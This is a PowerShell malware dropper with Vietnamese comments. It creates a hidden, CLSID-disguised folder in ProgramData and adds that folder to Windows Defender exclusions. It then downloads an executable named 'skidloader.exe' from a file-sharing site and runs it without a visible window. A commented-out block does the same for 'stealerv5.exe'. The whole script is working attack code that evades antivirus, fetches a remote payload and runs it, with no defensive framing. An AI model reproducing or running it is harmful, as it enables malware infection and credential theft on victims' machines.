$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir
$folderPath = $dir
# $filePath = "$folderPath\stealerv5.exe"
# $url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"

# Tạo thư mục nếu chưa tồn tại
# if (!(Test-Path $folderPath)) {
#     New-Item -ItemType Directory -Path $folderPath -Force
# }

# Kiểm tra nếu file chưa tồn tại thì tải về
# if (!(Test-Path $filePath)) {
#     Invoke-WebRequest -Uri $url -OutFile $filePath
# }

# Chạy file thực thi
# Start-Process -FilePath $filePath -NoNewWindow

$filePath = "$folderPath\loader.exe"
$url = "https://anonsharing.com/file/34157158f6d1f6e2/skidloader.exe"

# Tạo thư mục nếu chưa tồn tại
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}

# Kiểm tra nếu file chưa tồn tại thì tải về
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
}

# Chạy file thực thi
Start-Process -FilePath $filePath -NoNewWindow
